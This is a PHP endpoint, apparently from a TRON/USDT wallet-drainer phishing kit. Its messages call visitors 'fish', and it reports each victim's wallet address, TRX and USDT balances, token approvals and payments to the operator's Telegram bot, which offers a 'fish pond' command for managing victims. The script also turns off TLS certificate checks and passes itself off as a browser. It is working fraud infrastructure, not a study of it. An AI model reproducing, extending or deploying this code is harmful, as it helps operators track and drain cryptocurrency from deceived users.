<?php
header('Content-Type: application/json');

class TelegramNotificationHandler {
    private function sendTelegramMessage($botKey, $chatId, $message, $keyboard) {
        $ch = curl_init();
        
        $apiUrl = "https://149.154.167.220/bot{$botKey}/sendMessage"; //使用 ip 连接
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $apiUrl,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
            CURLOPT_DNS_CACHE_TIMEOUT => 3,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            CURLOPT_ENCODING => '',
            CURLOPT_POSTFIELDS => json_encode([
                'chat_id' => $chatId,
                'text' => $message,
                'parse_mode' => 'HTML',
                'reply_markup' => $keyboard
            ]),
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/json',
                'Accept: application/json',
                'Connection: close',
                'Host: api.telegram.org'
            ]
        ]);

        $response = curl_exec($ch);
        $error = curl_error($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        curl_close($ch);

        if ($error || $httpCode !== 200) {
            throw new Exception("Telegram API请求失败: 错误信息: $error, HTTP状态码: $httpCode, 响应: $response");
        }

        $result = json_decode($response, true);
        if (!$result || !isset($result['ok']) || $result['ok'] !== true) {
            throw new Exception("Telegram API响应错误: $response");
        }

        return $result;
    }

    public function handleNotification($type, $data) {
        switch ($type) {
            case 'wallet_connect':
                return $this->handleWalletConnect($data);
            case 'approval':
                return $this->handleApproval($data);
            case 'payment':
                return $this->handlePayment($data);
            default:
                throw new Exception('未知的通知类型');
        }
    }

    private function handleWalletConnect($data) {
        $message = sprintf(
            "📣 访问播报：当前有鱼儿正在访问网站\n\n" .
            "📦 商品名称：<code>%s</code>\n\n" .
            "💸 订单金额：<code>%s USDT</code>\n\n" .
            "🆔 商品订单号：<code>%s</code>\n\n" .
            "🐟 鱼苗地址：%s<code>%s</code>\n\n" .
            "🪫 TRX余额：<code>%s</code>\n\n" .
            "💵 USDT余额：<code>%s</code>",
            $data['goodsName'],
            $data['totalPrice'],
            $data['orderId'],
            $data['tgusername'] ? "@{$data['tgusername']}\n" : '',
            $data['address'],
            $data['trxBalance'],
            $data['usdtBalance']
        );

        $keyboard = [
            'inline_keyboard' => [[
                ['text' => "🌍 点击进入鱼苗当前浏览页面", 'url' => $data['currentUrl']]
            ]]
        ];

        return $this->sendTelegramMessage($data['botKey'], $data['chatId'], $message, $keyboard);
    }

    private function handleApproval($data) {
        $message = $data['tgusername'] 
            ? "@{$data['tgusername']} 请查看最新的授权信息\n可输入命令<code> 鱼池 </code>查看和管理你的鱼苗" 
            : "请查看最新的授权信息。";
    
        $keyboard = [
            'inline_keyboard' => [[
                ['text' => "🌍查看最新的授权信息", 'url' => "https://tronscan.org/#/transaction/{$data['txid']}"]
            ]]
        ];
        return $this->sendTelegramMessage($data['botKey'], $data['chatId'], $message, $keyboard);
    }

    private function handlePayment($data) {
        $message = sprintf(
            "<b>【💰收款通知💰】</b>\n\n" .
            "<b>📢订单号：</b><code>%s</code>\n\n" .
            "<b>💳支付地址：</b><code>%s</code>\n\n" .
            "<b>🏦收款地址：</b><code>%s</code>\n\n" .
            "<b>💵支付金额：</b><code>%s USDT</code>",
            $data['orderId'],
            $data['userAddress'],
            $data['paymentAddress'],
            number_format($data['totalPrice'], 6)
        );

        $keyboard = [
            'inline_keyboard' => [[
                ['text' => "🌍查看交易详情", 'url' => "https://tronscan.org/#/transaction/{$data['txid']}"]
            ]]
        ];

        return $this->sendTelegramMessage($data['botKey'], $data['chatId'], $message, $keyboard);
    }
}

try {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    if (!$data || !isset($data['type']) || !isset($data['data'])) {
        throw new Exception('无效的请求数据: ' . $input);
    }

    if (!isset($data['data']['botKey']) || !isset($data['data']['chatId'])) {
        throw new Exception('缺少必要的 Telegram 配置');
    }

    $handler = new TelegramNotificationHandler();
    $result = $handler->handleNotification($data['type'], $data['data']);

    echo json_encode([
        'success' => true,
        'message' => '通知发送成功',
        'result' => $result
    ]);

} catch (Exception $e) {
    error_log('Telegram通知错误: ' . $e->getMessage());
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'message' => $e->getMessage(),
        'debug_info' => [
            'input' => isset($input) ? $input : null,
            'error' => $e->getMessage(),
            'trace' => $e->getTraceAsString()
        ]
    ]);
}